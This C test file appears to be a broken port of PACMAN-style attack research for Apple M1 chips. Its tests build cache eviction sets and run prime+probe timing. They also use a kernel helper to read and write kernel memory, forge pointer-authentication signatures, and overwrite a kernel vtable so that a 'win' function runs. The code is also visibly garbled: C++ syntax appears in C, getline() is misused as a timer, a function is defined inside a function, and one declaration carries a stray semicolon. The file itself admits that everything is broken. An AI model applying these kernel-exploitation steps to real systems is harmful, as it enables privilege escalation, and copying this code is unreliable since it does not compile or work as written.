// tests.c
// Created by Rayyan Khan

#include <stdio.h>

#include "Headers/tests.h"
#include "Headers/retpoline.h"

// PLEASE NOTE: everything is currently broken
// Currently working on fixing this

void test_timers() {
    int x = 0;
    uint64_t t1_mach = getline();
    uint64_t t1 = read_volatile(&CTR);

    for (int i = 0; i < 1000; i++) {
        x = i / 2 + x;
    }

    uint64_t t2 = read_volatile(&CTR);
    uint64_t t2_mach = gettime();

    printf("Time difference (thread): %llu\n", t2 - t1);
    printf("Time difference (mach): %llu\n", t2_mach - t1_mach);
    printf("%d\n", x);
}

// Declaration of EvSet
typedef struct {
    uint8_t** addrs; // Use a pointer to an array of pointers
    int len;         // Length of the array
} EvSet;

void data_ev_set_test(uint8_t* shared_mem) {
    if (!set_core(CoreKind::PCORE)) {
        printf("Error setting CPU affinity!\n");
        return;
    }

    uint8_t* evset_addrs[/* MAX_SIZE */];

    evset = data_evset(&shared_mem[0], shared_mem);

    printf("reading 0x%X twice\n", (uint64_t)&shared_mem[0]);
    uint64_t t0 = read_counter();
    read_volatile(&shared_mem[0]);
    uint64_t t1 = read_counter();
    read_volatile(&shared_mem[0]);
    uint64_t t2 = read_counter();

    for (int i = 0; i < evset.len; i++) {
        read_volatile(evset.addrs[i]);
        // printf("evicting 0x%X\n", (uint64_t)evset.addrs[i]);
    }

    printf("reading 0x%X\n", (uint64_t)&shared_mem[0]);
    uint64_t t1_2 = read_counter();
    read_volatile(&shared_mem[0]);
    uint64_t t2_2 = read_counter();

    printf("Time difference (uncached): %llu\n", t1 - t0);
    printf("Time difference (cached): %llu\n", t2 - t1);
    printf("Time difference (post-eviction): %llu\n", t2_2 - t1_2);

    printf("=========================\n");

    // Now we show prime probe
    // prime
    for (int i = 0; i < evset.len; i++) {
        read_volatile(evset.addrs[i]);
    }

    // evict(?)
    // for (int i = 0; i < 1000; i++) {
    //     read_volatile(&shared_mem[0]);
    // }

    uint64_t results[0x10000];
    int cur_idx = 0;

    // probe
    for (int i = 0; i < evset.len; i++) {
        asm("isb");
        uint64_t t1_3 = read_counter();
        read_volatile(evset.addrs[i]);
        uint64_t t2_3 = read_counter();
        results[cur_idx] = t2_3 - t1_3;
        cur_idx++;
    }

    printf("prime+probe Results\n");
    printf("[ ] == Empty, [X] == Cached\n");
    int num_miss = 0;
    for (int i = 0; i < evset.len; i++) {
        if (results[i] >= 50) {
            printf("[ ] %llu\n", results[i]);
            num_miss++;
        } else {
            printf("[X] %llu\n", results[i]);
        }
    }

    printf("%d / %d\n", num_miss, evset.len);
}

// Declaration of InstEvSet
typedef struct {
    uint8_t** addrs; // Use a pointer to an array of pointers
    int len;         // Length of the array
} InstEvSet;

void inst_pev_set_test(uint8_t* shared_mem) {
    PacmanKitConnection handle;

    // Assuming the necessary initialization code for handle

    uint64_t kernel_mmap_va = handle.kernel_mmap();

    if (!kernel_mmap_va) {
        printf("Couldn't call IOMalloc in the kernel!\n");
        return;
    }

    uint64_t kernel_mmap_pa = handle.kernel_virt_to_phys(kernel_mmap_va);

    uint32_t target_set = cache_get_cache_set_m1(kernel_mmap_pa);

    printf("Kernel mmap VA: 0x%lX\n            PA: 0x%lX\n", kernel_mmap_va, kernel_mmap_pa);
    printf("Generating eviction set to match address with L2 set %u...\n", target_set);

    InstEvSet evset;

    // Call the inst_pevset function and assign the result to the InstEvSet variable
    evset = inst_pevset(kernel_mmap_va, kernel_mmap_pa, shared_mem);

    printf("Found %d conflicts.\n", evset.len);
    printf("%X\n", evset.addrs[0]);

    extern void* retpoline_fn;
    retpoline_fn = (void*)evset.addrs[0];

    uint64_t t1 = read_counter();
    asm("isb");
    retpoline_fn();
    asm("isb");
    uint64_t t2 = read_counter();
    asm("isb");
    retpoline_fn();
    asm("isb");
    uint64_t t3 = read_counter();

    for (int i = 0; i < evset.len; i++) {
        void (*retpoline_entry)() = (void (*)())evset.addrs[i];
        asm("isb");
        uint64_t t1_2 = read_counter();
        retpoline_entry();
        asm("isb");
        uint64_t t2_2 = read_counter();
    }

    uint64_t t1_2 = read_counter();
    asm("isb");
    retpoline_fn();
    asm("isb");
    uint64_t t2_2 = read_counter();

    printf("Uncached execution time: %llu\n", t2 - t1);
    printf("Cached execution time: %llu\n", t3 - t2);
    printf("Post eviction execution time: %llu\n", t2_2 - t1_2);
}

void test_pacmankit() {
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

    typedef struct {
        // Dummy implementation for PacmanKitConnection
    } PacmanKitConnection;

    typedef enum {
        PCORE,  // Assuming a CoreKind enumeration with PCORE
    } CoreKind;

    typedef struct {
        // Dummy implementation for other necessary structures
    } CacheInfo;

    uint64_t get_kernel_base;(PacmanKitConnection* handle){
        // Dummy implementation for get_kernel_base
        return 0;
    }

    uint64_t kernel_read(PacmanKitConnection* handle, uint64_t address) {
        // Dummy implementation for kernel_read
        return 0;
    }

    void kernel_write(PacmanKitConnection* handle, uint64_t address, uint64_t value) {
        // Dummy implementation for kernel_write
    }

    uint64_t kernel_virt_to_phys(PacmanKitConnection* handle, uint64_t virt_addr) {
        // Dummy implementation for kernel_virt_to_phys
        return 0;
    }

    uint64_t user_virt_to_phys(PacmanKitConnection* handle, uint64_t virt_addr) {
        // Dummy implementation for user_virt_to_phys
        return 0;
    }

    uint64_t get_handle_loc(PacmanKitConnection* handle) {
        // Dummy implementation for get_handle_loc
        return 0;
    }

    CacheInfo get_cache_info(uint64_t address) {
        CacheInfo info;
        // Dummy implementation for get_cache_info
        return info;
    }

    void* kernel_mmap(PacmanKitConnection* handle) {
        // Dummy implementation for kernel_mmap
        return NULL;
    }

    void kernel_free(PacmanKitConnection* handle) {
        // Dummy implementation for kernel_free
    }

    void test_pacmankit() {
        PacmanKitConnection handle;

        // Assuming necessary initialization code for handle

        uint64_t kernel_base = get_kernel_base(&handle);
        printf("Kernel base is at 0x%lX\n", kernel_base);

        uint64_t kernel_base_value = kernel_read(&handle, kernel_base);
        printf("Kernel base contains 0x%lX\n", kernel_base_value);

        kernel_write(&handle, kernel_base, 0x100000CFEEDFACF);
        kernel_base_value = kernel_read(&handle, kernel_base);
        printf("Kernel base contains 0x%lX\n", kernel_base_value);

        uint64_t phys_user_addr = user_virt_to_phys(&handle, (uint64_t)&handle);
        printf("User address 0x%lX has physical address 0x%lX\n", (uint64_t)&handle, phys_user_addr);

        uint64_t handle_loc = get_handle_loc(&handle);
        printf("Handle is at 0x%lX\n", handle_loc);

        uint64_t cache_test_addr = 0x17F;
        printf("Offset is %d\n", get_cache_info(cache_test_addr).offset);
        printf("Set is 0x%lX\n", get_cache_info(cache_test_addr).set);
        printf("Tag is 0x%lX\n", get_cache_info(cache_test_addr).tag);

        void* kern_mmap_ptr = kernel_mmap(&handle);
        printf("Got a pointer at %p\n", kern_mmap_ptr);

        kernel_free(&handle);
    }
}

void test_forge_pacs() {
    // Initialize PacmanKitConnection handles
    PacmanKitConnection handle = init_PacmanKitConnection();
    PacmanKitConnection victim_handle = init_PacmanKitConnection();

    // Obtain victim IOUserClient base address
    uintptr_t iouserclient_base = get_handle_loc(&victim_handle);

    // Calculate addresses
    uintptr_t pacmankitservice = iouserclient_base + PACMANKIT_TO_HELPER;
    uintptr_t pacmankitservice_vtable = kernel_read(&handle, pacmankitservice);
    uintptr_t pacmankitservice_vtable_masked = pacmankitservice_vtable | PAC_BITMASK;
    uintptr_t pacmankitservice_externalMethod = kernel_read(&handle, pacmankitservice_vtable);
    uintptr_t pacmankitservice_externalMethod_masked = pacmankitservice_externalMethod | PAC_BITMASK;

    // Print addresses
    printf("IOService is at 0x%lX\n", iouserclient_base);
    printf("PacmanKitService is at 0x%lX\n", pacmankitservice);
    printf("PacmanKitService`vtable is at 0x%lX\n", pacmankitservice_vtable_masked);
    printf("PacmanKitService`vtable signed is 0x%lX\n", pacmankitservice_vtable);
    printf("PacmanKitService`externalMethod signed is 0x%lX\n", pacmankitservice_externalMethod);

    // Get salt data
    uintptr_t salt_data = get_salt(pacmankitservice | PAC_BITMASK, 0xd986);
    uintptr_t salt_inst = get_salt(pacmankitservice_vtable | PAC_BITMASK, 0xa7d5);

    // Forge vtable entries
    for (int i = 0; i < 1000; ++i) {
        uintptr_t forged_vtable_ptr = forge_sign_data(&handle, pacmankitservice_vtable_masked, salt_data);
        uintptr_t forged_vtable_entry = forge_sign_inst(&handle, pacmankitservice_externalMethod_masked, salt_inst);

        // Print forged entries
        printf("Forge-signed vtable is 0x%lX\n", forged_vtable_ptr);
        printf("Forge-signed externalMethod is 0x%lX\n", forged_vtable_entry);

        // Assert equality
        assert(forged_vtable_ptr == pacmankitservice_vtable);
        assert(forged_vtable_entry == pacmankitservice_externalMethod);
    }

    // Leak win pointer
    uintptr_t win_ptr = leak_win(&handle);

    // Manually call win:
    // kernel_exec_for_timing(&handle, win_ptr, true);

    // Forge vtable with mmap region and use that to call win
    uintptr_t kernel_mmap = kernel_mmap(&handle);
    uintptr_t new_vtable_ptr = forge_sign_data(&handle, kernel_mmap, salt_data);
    uintptr_t new_vtable_entry = forge_sign_inst(&handle, win_ptr, salt_inst);

    // Write new vtable entry and pointer
    kernel_write(&handle, kernel_mmap | PAC_BITMASK, new_vtable_entry);
    kernel_write(&handle, pacmankitservice | PAC_BITMASK, new_vtable_ptr);

    // This should not be redirected
    call_service_routine(&handle, 0, 1, 2, 3, 4, 5);

    // This one should be redirected
    call_service_routine(&victim_handle, 0, 1, 2, 3, 4, 5);
}
